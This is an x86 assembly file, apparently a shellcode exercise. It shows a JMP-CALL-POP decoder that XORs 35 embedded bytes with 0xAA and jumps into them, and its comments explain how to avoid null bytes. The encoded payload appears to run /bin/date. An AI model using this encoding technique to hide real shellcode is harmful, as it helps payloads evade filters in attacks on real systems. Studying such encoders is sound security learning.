global _start

section .text

_start:
	xor eax, eax
	jmp function1

function2:
	pop eax
	
	xor ecx, ecx
	mov cl, 35

labelloop:
	
	xor byte [eax], 0xAA  	;you popped the address, now eax reffers to byte array. But we need to xor the value at that address. You might do xor eax, 0xAA
				;but it is wrong bcz in that case it will add null bytes in opcode. Also xor al, 0xAA will be wrong, bcz in that case the 1st 8 bits
				;of address stored in $eax will be used as operand. That's why we need whole $eax. So to avoid null bytes, I used byte [$eax]
	;jz encoded
	inc eax
	loop labelloop
	
	jmp encoded

function1:
	call function2
	encoded: db 0x41,0xb8,0xf1,0x9b,0x6a,0xfa,0x23,0x4f,0x22,0xe9,0xa3,0xf9,0x23,0x4b,0x23,0x40,0x1a,0xa1,0x67,0x2a,0x42,0x43,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xce,0xcb,0xde,0xcf,0xeb ;,0xaa 
